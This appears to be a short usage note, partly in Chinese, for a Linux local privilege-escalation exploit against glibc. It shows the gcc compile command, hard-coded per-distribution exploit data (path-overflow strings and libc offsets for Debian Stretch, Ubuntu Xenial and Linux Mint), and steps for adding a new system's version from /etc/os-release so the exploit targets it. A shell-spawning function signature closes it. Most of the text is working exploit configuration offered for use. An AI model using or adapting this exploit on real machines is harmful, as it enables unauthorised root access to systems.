#####gcc -o out exp.c -std=c99

#####版本硬编码，可将当前系统加入尝试

```c++
static char* osSpecificExploitDataList[]={
// Debian Stretch
    "\"9 (stretch)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "from_archive",
// Delta for Debian Stretch "2.24-11+deb9u1"
    "\x06\0\0\0\x24\0\0\0\x3e\0\0\0\x7f\xb9\x08\x00\x4f\x86\x09\x00",
// Ubuntu Xenial libc=2.23-0ubuntu9
    "\"16.04.3 LTS (Xenial Xerus)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
// Linux Mint 18.3 Sylvia - same parameters as "Ubuntu Xenial"
    "\"18.3 (Sylvia)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
    NULL};
```

cat /etc/os-release 

Then add the VERSION into osSpecificExploitDataList.

```c++
static char* osSpecificExploitDataList[]={
// Debian Stretch
    "\"9 (stretch)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "from_archive",
// Delta for Debian Stretch "2.24-11+deb9u1"
    "\x06\0\0\0\x24\0\0\0\x3e\0\0\0\x7f\xb9\x08\x00\x4f\x86\x09\x00",
// Ubuntu Xenial libc=2.23-0ubuntu9
    "\"17.10 (Artful Aardvark)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
// Ubuntu Xenial libc=2.23-0ubuntu9
    "\"16.04.3 LTS (Xenial Xerus)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
// Linux Mint 18.3 Sylvia - same parameters as "Ubuntu Xenial"
    "\"18.3 (Sylvia)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
    NULL};
```
##### command

```c++
int incokeShell(char *shellName)
```

